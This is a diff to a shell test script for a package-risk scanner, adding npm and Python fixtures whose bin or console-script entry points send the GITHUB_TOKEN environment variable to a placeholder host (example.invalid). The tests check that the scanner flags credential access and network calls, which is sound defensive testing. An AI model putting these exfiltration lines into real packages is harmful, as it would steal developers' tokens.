@@ -103,6 +103,20 @@ run_capture 22 "$WORK_DIR/npm-api-compatible.json" "$CLI" package-risk assess --
 require_contains 'credential_or_environment_access' "$WORK_DIR/npm-api-compatible.json" npm_api_secret
 require_contains 'network_capability_observed' "$WORK_DIR/npm-api-compatible.json" npm_api_network
 
+NPM_BIN_ENTRY="$WORK_DIR/npm-bin-entry"
+mkdir -p "$NPM_BIN_ENTRY"
+cat >"$NPM_BIN_ENTRY/package.json" <<'JSON'
+{"name":"npm-bin-entry-fixture","version":"1.0.0","whoatherePublishedAtUnixSeconds":1700000000,"bin":{"npm-bin-entry-fixture":"cli.js"}}
+JSON
+cat >"$NPM_BIN_ENTRY/cli.js" <<'JS'
+fetch("https://example.invalid/collect?token=" + process.env.GITHUB_TOKEN)
+JS
+run_capture 22 "$WORK_DIR/npm-bin-entry.json" "$CLI" package-risk assess --workspace "$NPM_BIN_ENTRY" --ecosystem npm --state-dir "$STATE_DIR" --json
+require_contains 'npm_bin_entry_declared' "$WORK_DIR/npm-bin-entry.json" npm_bin_indicator
+require_contains 'npm_bin_entry_requires_manual_review' "$WORK_DIR/npm-bin-entry.json" npm_bin_review
+require_contains 'credential_or_environment_access' "$WORK_DIR/npm-bin-entry.json" npm_bin_secret
+require_contains 'network_capability_observed' "$WORK_DIR/npm-bin-entry.json" npm_bin_network
+
 NPM_CI_DELAY="$WORK_DIR/npm-ci-delay"
 mkdir -p "$NPM_CI_DELAY"
 cat >"$NPM_CI_DELAY/package.json" <<'JSON'
@@ -210,6 +224,25 @@ class Client:
 PY
 run_capture 22 "$WORK_DIR/python-api-compatible.json" "$CLI" package-risk assess --workspace "$API_COMPAT" --ecosystem pypi --state-dir "$STATE_DIR" --json
 require_contains 'credential_or_environment_access' "$WORK_DIR/python-api-compatible.json" api_secret
+
+PYTHON_ENTRYPOINT="$WORK_DIR/python-entrypoint"
+make_pyproject "$PYTHON_ENTRYPOINT" "python_entrypoint"
+cat >>"$PYTHON_ENTRYPOINT/pyproject.toml" <<'PY'
+
+[project.scripts]
+python-entrypoint = "python_entrypoint:main"
+PY
+cat >"$PYTHON_ENTRYPOINT/python_entrypoint/__init__.py" <<'PY'
+def main():
+    import os
+    import urllib.request
+    return urllib.request.urlopen("https://example.invalid/?t=" + os.environ.get("GITHUB_TOKEN", ""))
+PY
+run_capture 22 "$WORK_DIR/python-entrypoint.json" "$CLI" package-risk assess --workspace "$PYTHON_ENTRYPOINT" --ecosystem pypi --state-dir "$STATE_DIR" --json
+require_contains 'python_console_script_entry_declared' "$WORK_DIR/python-entrypoint.json" python_entrypoint_indicator
+require_contains 'python_entry_point_requires_manual_review' "$WORK_DIR/python-entrypoint.json" python_entrypoint_review
+require_contains 'credential_or_environment_access' "$WORK_DIR/python-entrypoint.json" python_entrypoint_secret
+require_contains 'network_capability_observed' "$WORK_DIR/python-entrypoint.json" python_entrypoint_network
 
 MACOS_ONLY="$WORK_DIR/python-macos-only"
 make_pyproject "$MACOS_ONLY" "python_macos_only"
